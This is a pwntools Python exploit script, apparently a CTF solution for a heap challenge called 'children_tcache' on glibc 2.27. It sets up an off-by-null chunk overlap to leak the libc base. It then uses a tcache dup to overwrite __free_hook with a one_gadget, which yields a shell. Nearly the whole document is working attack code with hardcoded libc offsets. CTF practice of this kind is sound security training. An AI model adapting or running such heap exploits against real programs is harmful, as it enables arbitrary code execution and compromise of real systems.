from pwn import *
context(os="linux", arch="amd64")

DEBUG = 1
LOCAL = 1

def debug_on():
	context.log_level = "debug"

g_fname = "./children_tcache"
g_elf = ELF(g_fname)
g_libcname = "./libc.so.6"

if (LOCAL):
	g_io = process(g_fname)
	g_libc = g_elf.libc
else:
	g_io = remote()
	g_libc = ELF(g_libcname)

def getpid():
	if (DEBUG & LOCAL):
		log.info("PID: %d", g_io.proc.pid)
		pause()

s, sa, sl, sla = g_io.send, g_io.sendafter, g_io.sendline, g_io.sendlineafter
r, ru, rl = g_io.recv, g_io.recvuntil, g_io.recvline

def opt(idx):
	sla("Your choice: ", str(idx))
	
def new(size, content):
	opt(1)
	sla("Size:", str(size))
	sa("Data:", content)

def show(idx):
	opt(2)
	sla("Index:", str(idx))

def delete(idx):
	opt(3)
	sla("Index:", str(idx))

def pwn():
	# =========================
	# Part 1: leak libc base.
	# =========================
	new(0x410, "A\n") # slot_0
	new(0x28, "B\n")  # slot_1
	new(0x4f0, "C\n") # slot_2
	new(0x20, "barrier\n") # slot_3

	delete(0) # release slot_0
	delete(1) # release slot_1
	# clean C's prev_inuse bit and set C->prev_size=0
	for i in range(7):
		new(0x28-i, 'a'*(0x28-i))
		delete(0)
	# make C->prev_size=chunk_A.size + chunk_B.size = 0x450	
	new(0x28, b'B'*0x20 + p64(0x420 + 0x30)) # take slot_0
	getpid()

	# trigger unlink
	delete(2) # release slot_2
	new(0x410, "A\n") # take slot_1, realloc chunk A, write main_arena+96 to B->fd
	show(0) # leak libc address.
	
	data = rl()[:-1]
	libc_base = u64(data.ljust(8, b'\0')) - 96 - 0x3ebc40 # libc-2.27
	g_libc.address = libc_base
	addr_free_hook = g_libc.symbols["__free_hook"]
	one_gadget = libc_base + 0x4f432 # libc-2.27, [rsp+0x40]==NULL
	log.success("libc@%#x\nfree_hook@%#x\none_gadget@%#x", libc_base, addr_free_hook, one_gadget)

	# =========================
	# Part 2: hijack __free_hook to one_gadget via tcache dup alloc/free
	# =========================
	new(0x28, "dup alloc B\n") # take slot_2
	new(0x28, "fill tcache with 3 entries") # take slot_4
	
	delete(4)
	delete(2)
	delete(0)

	new(0x28, p64(addr_free_hook)) # slot_0
	new(0x28, "Anything is ok\n")  # slot_2
	new(0x28, p64(one_gadget))	   # slot_4

	delete(0) # trigger one_gadget, get shell!
	
if ("__main__" == __name__):
	debug_on()
	pwn()
	g_io.interactive()

